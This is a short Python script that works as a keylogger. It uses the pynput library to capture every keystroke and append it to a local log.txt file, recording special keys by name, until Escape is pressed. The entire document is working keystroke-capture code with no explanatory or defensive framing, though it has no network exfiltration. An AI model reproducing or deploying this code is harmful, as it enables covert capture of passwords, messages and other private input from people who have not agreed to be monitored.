from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as log_file:
        #file.write("")
        try:
            log_file.write(key.char)
        except AttributeError:
            if key == Key.space:
                log_file.write(" ")
            elif key == Key.enter:
                log_file.write("\n")
            else:
                log_file.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:  
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
